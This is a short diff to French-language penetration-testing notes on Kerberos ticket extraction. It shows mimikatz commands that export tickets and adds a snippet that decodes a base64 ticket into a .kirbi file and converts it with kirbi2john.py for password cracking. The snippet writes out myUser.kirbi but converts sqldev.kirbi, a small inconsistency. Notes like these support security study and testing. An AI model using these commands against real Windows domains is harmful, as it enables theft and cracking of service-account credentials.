@@ -52,6 +52,11 @@ mimikatz # base64 /out:true    <==== si on veut générer des fichiers .kirbi
 mimikatz # kerberos::list /export  
 ```
 
+```shell
+# conversion depuis base64
+echo "<base64 blob>" |  tr -d \\n | base64 -d > myUser.kirbi
+kirbi2john.py sqldev.kirbi
+```
 
 #### Utiliser Rubeus.exe
 
